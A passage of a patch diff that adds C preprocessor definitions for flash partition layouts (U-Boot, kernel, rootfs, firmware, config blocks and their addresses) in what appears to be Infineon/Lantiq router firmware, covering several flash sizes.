+  #define IFX_CFG_FLASH_WLAN_CFG_BLOCK_NAME	      	  "wlanconfig"
+  #define IFX_CFG_FLASH_WLAN_CFG_START_ADDR	      	  0x003F2000
+  #define IFX_CFG_FLASH_WLAN_CFG_SIZE		          0x2000
+  #define IFX_CFG_FLASH_WLAN_CFG_END_ADDR		  0x003F3FFF  
+
+  #define IFX_CFG_FLASH_END_ADDR                         0x003FFFFF
+
+#elif (IFX_CONFIG_FLASH_SIZE == 8)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00020000\0"                                      \
+        "total_part=2\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block4=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block5=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "data_block6=" IFX_CFG_FLASH_WLAN_CFG_BLOCK_NAME "\0"    \
+        "total_db=7\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME            "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR            0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                  0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0x00020000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x007DFFFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x007E0000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x007EFFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x007F0000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x007F0FFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME          "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR          0x007F1000
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE                0x1000
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR            0x007F1FFF
+  
+  #define IFX_CFG_FLASH_WLAN_CFG_BLOCK_NAME	      	  "wlanconfig"
+  #define IFX_CFG_FLASH_WLAN_CFG_START_ADDR	      	  0x007F2000
+  #define IFX_CFG_FLASH_WLAN_CFG_SIZE		          0x2000
+  #define IFX_CFG_FLASH_WLAN_CFG_END_ADDR		  0x007F3FFF  
+
+  #define IFX_CFG_FLASH_END_ADDR                          0x007FFFFF
+  
+#else
+  #error "ERROR!! Define flash size first!"
+#endif
+
+#else /*Not defined CONFIG_FIRMWARE_IN_ROOTFS*/
+#if (IFX_CONFIG_FLASH_SIZE == 1)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00020000\0"                                      \
+        "part2_begin=0x000A0000\0"                                      \
+        "total_part=3\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO          \
+  "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"  \
+  "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0" \
+  "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0" \
+  "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0" \
+  "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"   \
+  "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"    \
+  "data_block6=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"  \
+  "total_db=7\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME          "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR          0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME       "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR       0x00020000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE             0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME    "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME         "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR         0x000A0000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME         "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR         0x000F5FFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE               0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME           "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR           0x000F6000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                 0x8000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR             0x000FDFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME            "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR            0x000FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                  0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR              0x000FEFFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME        "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR        0x000FFE00
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE              0x0200
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR          0x000FFFFF
+
+  #define IFX_CFG_FLASH_END_ADDR                        0x000FFFFF
+
+//2MB flash partition
+#elif (IFX_CONFIG_FLASH_SIZE == 2)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00020000\0"                                      \
+        "part2_begin=0x000A0000\0"                                      \
+        "total_part=3\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO          \
+  "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"  \
+  "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0" \
+  "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0" \
+  "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0" \
+  "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"   \
+  "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"    \
+  "data_block6=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"  \
+  "total_db=7\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME          "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR          0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME       "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR       0x00020000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE             0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME    "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME         "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR         0x000A0000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME         "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR         0x001F5FFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE               0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME           "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR           0x001F6000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                 0x8000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR             0x001FDFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME            "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR            0x001FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                  0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR              0x001FEFFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME        "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR        0x001FFE00
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE              0x0200
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR          0x001FFFFF
+
+  #define IFX_CFG_FLASH_END_ADDR                        0x001FFFFF
+
+//4MB flash partition
+#elif (IFX_CONFIG_FLASH_SIZE == 4)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00020000\0"                                      \
+        "part2_begin=0x000A0000\0"                                      \
+        "total_part=3\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block6=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "data_block7=" IFX_CFG_FLASH_WLAN_CFG_BLOCK_NAME "\0"    \
+        "total_db=8\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME           "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR           0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME        "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR        0x00020000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE              0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME     "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME          "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR          0x000A0000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x003DFFFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x003E0000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x003EFFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x003F0000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x003F0FFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME          "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR          0x003F1000
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE                0x1000
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR            0x003F1FFF
+  
+  #define IFX_CFG_FLASH_WLAN_CFG_BLOCK_NAME	      	  "wlanconfig"
+  #define IFX_CFG_FLASH_WLAN_CFG_START_ADDR	      	  0x003F2000
+  #define IFX_CFG_FLASH_WLAN_CFG_SIZE		          0x2000
+  #define IFX_CFG_FLASH_WLAN_CFG_END_ADDR		  0x003F3FFF  
+
+  #define IFX_CFG_FLASH_END_ADDR                         0x003FFFFF
+
+#elif (IFX_CONFIG_FLASH_SIZE == 8)
+#if !defined( CONFIG_VR9_GPHY_FW_EMBEDDED )
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00010000\0"                                      \
+        "part2_begin=0x00020000\0"                                      \
+        "part3_begin=0x000A0000\0"                                      \
+        "total_part=4\0"
+#else
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00020000\0"                                      \
+        "part2_begin=0x000A0000\0"                                      \
+        "total_part=3\0"
+#endif
+
+#if !defined( CONFIG_VR9_GPHY_FW_EMBEDDED )
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_BLOCK_NAME "\0"        \
+        "data_block2=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block3=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block5=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block6=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block7=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "data_block8=" IFX_CFG_FLASH_WLAN_CFG_BLOCK_NAME "\0"    \
+        "total_db=9\0"
+#else
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block6=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "data_block7=" IFX_CFG_FLASH_WLAN_CFG_BLOCK_NAME "\0"    \
+        "total_db=8\0"
+#endif
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME            "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR            0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                  0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock0"
+
+#if !defined( CONFIG_VR9_GPHY_FW_EMBEDDED )
+  #define IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_BLOCK_NAME            "gphy_firmware"
+  #define IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_START_ADDR            0x00010000
+  #define IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_SIZE                  0
+  #define IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock1"
+#endif
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME         "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR         0x00020000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE               0
+#if !defined( CONFIG_VR9_GPHY_FW_EMBEDDED )
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock2"
+#else
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock1"
+#endif
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0x000A0000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0
+#if !defined( CONFIG_VR9_GPHY_FW_EMBEDDED )
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock3"
+#else
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock2"
+#endif
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x007DFFFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x007E0000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x007EFFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x007F0000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x2000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x007F1FFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME               "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR               0x007F2000
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE                     0x1000
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR                 0x007F2FFF
+  
+  #define IFX_CFG_FLASH_WLAN_CFG_BLOCK_NAME	          "wlanconfig"
+  #define IFX_CFG_FLASH_WLAN_CFG_START_ADDR	      	  0x007F3000
+  #define IFX_CFG_FLASH_WLAN_CFG_SIZE		          0x2000
+  #define IFX_CFG_FLASH_WLAN_CFG_END_ADDR		  0x007F4FFF
+
+  #define IFX_CFG_FLASH_END_ADDR                          0x007FFFFF
+
+#elif (IFX_CONFIG_FLASH_SIZE == 16)
+#if !defined( CONFIG_VR9_GPHY_FW_EMBEDDED )
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00010000\0"                                      \
+        "part2_begin=0x00020000\0"                                      \
+        "part3_begin=0x000A0000\0"                                      \
+        "total_part=4\0"
+#else
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00020000\0"                                      \
+        "part2_begin=0x000A0000\0"                                      \
+        "total_part=3\0"
+#endif
+
+#ifdef CONFIG_OVERLAY
+  #if !defined( CONFIG_VR9_GPHY_FW_EMBEDDED )
+    #define IFX_CFG_FLASH_DATA_BLOCKS_INFO                              \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_BLOCK_NAME "\0"        \
+        "data_block2=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block3=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block5=" IFX_CFG_FLASH_DATA_IMAGE_BLOCK_NAME "\0"         \
+        "data_block6=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block7=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block8=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "data_block9=" IFX_CFG_FLASH_WLAN_CFG_BLOCK_NAME "\0"    \
+        "total_db=10\0"
+  #else
+    #define IFX_CFG_FLASH_DATA_BLOCKS_INFO                              \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_DATA_IMAGE_BLOCK_NAME "\0"         \
+        "data_block5=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block6=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block7=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "data_block8=" IFX_CFG_FLASH_WLAN_CFG_BLOCK_NAME "\0"    \
+        "total_db=9\0"
+  #endif
+#else
+   #if !defined( CONFIG_VR9_GPHY_FW_EMBEDDED )
+    #define IFX_CFG_FLASH_DATA_BLOCKS_INFO                              \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_BLOCK_NAME "\0"        \
+        "data_block2=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block3=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block5=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block6=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block7=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "data_block8=" IFX_CFG_FLASH_WLAN_CFG_BLOCK_NAME "\0"    \
+        "total_db=9\0"
+  #else
+    #define IFX_CFG_FLASH_DATA_BLOCKS_INFO                              \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block6=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "data_block7=" IFX_CFG_FLASH_WLAN_CFG_BLOCK_NAME "\0"    \
+        "total_db=8\0"
+  #endif
+#endif
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME            "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR            0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                  0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock0"
+
+#if !defined( CONFIG_VR9_GPHY_FW_EMBEDDED )
+  #define IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_BLOCK_NAME            "gphy_firmware"
+  #define IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_START_ADDR            0x00010000
+  #define IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_SIZE                  0
+  #define IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock1"
+#endif
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME         "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR         0x00020000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE               0
+#if !defined( CONFIG_VR9_GPHY_FW_EMBEDDED )
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock2"
+#else
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock1"
+#endif
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0x000A0000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0
+#if !defined( CONFIG_VR9_GPHY_FW_EMBEDDED )
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock3"
+#else
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock2"
+#endif
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x00DDFFFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+#ifdef CONFIG_OVERLAY
+  #define IFX_CFG_FLASH_DATA_IMAGE_BLOCK_NAME             "data"
+  #define IFX_CFG_FLASH_DATA_IMAGE_START_ADDR             0x00DE0000
+  #define IFX_CFG_FLASH_DATA_IMAGE_SIZE                   0x200000
+  #define IFX_CFG_FLASH_DATA_IMAGE_END_ADDR               0x00FDFFFF
+#endif
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x00FE0000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x00FEFFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x00FF0000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x2000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x00FF1FFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME               "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR               0x00FF2000
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE                     0x1000
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR                 0x00FF2FFF
+  
+  #define IFX_CFG_FLASH_WLAN_CFG_BLOCK_NAME	          "wlanconfig"
+  #define IFX_CFG_FLASH_WLAN_CFG_START_ADDR	      	  0x00FF3000
